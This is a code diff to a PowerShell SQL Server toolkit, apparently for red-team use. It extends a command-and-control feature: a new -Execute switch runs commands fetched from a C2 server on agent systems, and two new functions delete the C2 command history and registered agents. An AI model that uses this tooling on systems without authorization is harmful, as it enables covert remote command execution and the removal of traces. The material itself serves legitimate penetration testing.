@@ -1199,9 +1199,14 @@ Function Get-SQLC2Command
             .PARAMETER DAC
             Connect using Dedicated Admin Connection.
             .PARAMETER DatabaseName
-            Database name that contains target table.                      
+            Database name that contains target table.      
+            .PARAMETER Execute
+            Run all of the commands downloaded from the C2 server on the agent system.                                 
             .EXAMPLE
             PS C:\> Get-SQLC2Command -Instance "SQLServer1\STANDARDDEV2014" -Database database1
+            .EXAMPLE
+            PS C:\> Get-SQLC2Command -Instance "SQLServer1\STANDARDDEV2014" -Database database1 -Execute
+            .EXAMPLE
             PS C:\> Get-SQLC2Command -Username CloudAdmin -Password 'CloudPassword!' -Instance cloudserver1.database.windows.net -Database database1
     #>
     [CmdletBinding()]
@@ -1631,5 +1636,257 @@ Function Get-SQLC2Result
     {
         # Return data
         $TblResults
+    }
+ }
+
+
+# ----------------------------------
+#  Clear-SQLC2Command
+# ----------------------------------
+# Author: Scott Sutherland
+Function Clear-SQLC2Command
+{
+    <#
+            .SYNOPSIS
+            This command clears the command history on the remote c2 SQL Server. 
+            .PARAMETER Username
+            SQL Server or domain account to authenticate with.
+            .PARAMETER Password
+            SQL Server or domain account password to authenticate with.
+            .PARAMETER Credential
+            SQL Server credential.
+            .PARAMETER Instance
+            SQL Server instance to connection to.
+            .PARAMETER DAC
+            Connect using Dedicated Admin Connection.
+            .PARAMETER DatabaseName
+            Database name that contains target table.     
+            .PARAMETER ServerName
+            Server name to clear command history for.                               
+            .EXAMPLE
+            PS C:\> Clear-SQLC2Command -Instance "SQLServer1\STANDARDDEV2014" -Database database1
+            .EXAMPLE
+            PS C:\> Clear-SQLC2Command -Instance "SQLServer1\STANDARDDEV2014" -Database database1 -ServerName Server1
+            .EXAMPLE
+            PS C:\> Clear-SQLC2Command -Username CloudAdmin -Password 'CloudPassword!' -Instance cloudserver1.database.windows.net -Database database1
+    #>
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'SQL Server or domain account to authenticate with.')]
+        [string]$Username,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
+        [string]$Password,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Windows credentials.')]
+        [System.Management.Automation.PSCredential]
+        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
+
+        [Parameter(Mandatory = $false,
+                ValueFromPipelineByPropertyName = $true,
+        HelpMessage = 'SQL Server instance to connection to.')]
+        [string]$Instance,
+
+        [Parameter(Mandatory = $false,
+                ValueFromPipeline = $true,
+                ValueFromPipelineByPropertyName = $true,
+        HelpMessage = 'Database containing target C2 table.')]
+        [string]$Database,
+
+        [Parameter(Mandatory = $false,
+                ValueFromPipeline = $true,
+                ValueFromPipelineByPropertyName = $true,
+        HelpMessage = 'Server to clear command history for.')]
+        [string]$ServerName,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
+        [switch]$SuppressVerbose
+    )
+
+    Begin
+    {
+        # Create data tables for output
+        $TblResults = New-Object -TypeName System.Data.DataTable
+
+        if($ServerName){
+            $ServerFilter = "WHERE servername like '$ServerName'"
+        }else{
+            $ServerFilter = ""
+        }
+    }
+
+    Process
+    {
+        # Parse computer name from the instance
+        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
+
+        # Default connection to local default instance
+        if(-not $Instance)
+        {
+            $Instance = $env:COMPUTERNAME
+        }
+
+        # Test connection to instance
+        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
+            $_.Status -eq 'Accessible'
+        }
+        if($TestConnection)
+        {
+            if( -not $SuppressVerbose)
+            {
+                Write-Verbose -Message "$Instance : Connection Success."
+                Write-Verbose "$instance : Attempting to clear command history from $Instance."
+            }
+        }
+        else
+        {
+            if( -not $SuppressVerbose)
+            {
+                Write-Verbose -Message "$Instance : Connection Failed."
+            }
+            return
+        }     
+        
+        # Setup query to grab commands        
+        $Query = "DELETE FROM dbo.C2COMMANDS 
+                  $ServerFilter"
+
+        # Execute Query
+        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database $Database -SuppressVerbose 
+    }
+
+    End
+    {
+        Write-Verbose "$instance : Done."
+    }
+ }
+
+
+# ----------------------------------
+#  Clear-SQLC2Agent
+# ----------------------------------
+# Author: Scott Sutherland
+Function Clear-SQLC2Agent
+{
+    <#
+            .SYNOPSIS
+            This command clears the agents registered on the remote c2 SQL Server. 
+            .PARAMETER Username
+            SQL Server or domain account to authenticate with.
+            .PARAMETER Password
+            SQL Server or domain account password to authenticate with.
+            .PARAMETER Credential
+            SQL Server credential.
+            .PARAMETER Instance
+            SQL Server instance to connection to.
+            .PARAMETER DAC
+            Connect using Dedicated Admin Connection.
+            .PARAMETER DatabaseName
+            Database name that contains target table.     
+            .PARAMETER ServerName
+            Server name to clear command history for.                               
+            .EXAMPLE
+            PS C:\> Clear-SQLC2Agent -Instance "SQLServer1\STANDARDDEV2014" -Database database1
+            .EXAMPLE
+            PS C:\> Clear-SQLC2Agent -Instance "SQLServer1\STANDARDDEV2014" -Database database1 -ServerName Server1
+            .EXAMPLE
+            PS C:\> Clear-SQLC2Agent -Username CloudAdmin -Password 'CloudPassword!' -Instance cloudserver1.database.windows.net -Database database1
+    #>
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'SQL Server or domain account to authenticate with.')]
+        [string]$Username,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
+        [string]$Password,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Windows credentials.')]
+        [System.Management.Automation.PSCredential]
+        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
+
+        [Parameter(Mandatory = $false,
+                ValueFromPipelineByPropertyName = $true,
+        HelpMessage = 'SQL Server instance to connection to.')]
+        [string]$Instance,
+
+        [Parameter(Mandatory = $false,
+                ValueFromPipeline = $true,
+                ValueFromPipelineByPropertyName = $true,
+        HelpMessage = 'Database containing target C2 table.')]
+        [string]$Database,
+
+        [Parameter(Mandatory = $false,
+                ValueFromPipeline = $true,
+                ValueFromPipelineByPropertyName = $true,
+        HelpMessage = 'Server to clear command history for.')]
+        [string]$ServerName,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
+        [switch]$SuppressVerbose
+    )
+
+    Begin
+    {
+        # Create data tables for output
+        $TblResults = New-Object -TypeName System.Data.DataTable
+
+        if($ServerName){
+            $ServerFilter = "WHERE servername like '$ServerName'"
+        }else{
+            $ServerFilter = ""
+        }
+    }
+
+    Process
+    {
+        # Parse computer name from the instance
+        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
+
+        # Default connection to local default instance
+        if(-not $Instance)
+        {
+            $Instance = $env:COMPUTERNAME
+        }
+
+        # Test connection to instance
+        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
+            $_.Status -eq 'Accessible'
+        }
+        if($TestConnection)
+        {
+            if( -not $SuppressVerbose)
+            {
+                Write-Verbose -Message "$Instance : Connection Success."
+                Write-Verbose "$instance : Attempting to clear agent(s) from $Instance."
+            }
+        }
+        else
+        {
+            if( -not $SuppressVerbose)
+            {
+                Write-Verbose -Message "$Instance : Connection Failed."
+            }
+            return
+        }     
+        
+        # Setup query to grab commands        
+        $Query = "DELETE FROM dbo.C2AGENTS
+                  $ServerFilter"
+
+        # Execute Query
+        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database $Database -SuppressVerbose 
+    }
+
+    End
+    {
+        Write-Verbose "$instance : Done."
     }
  }
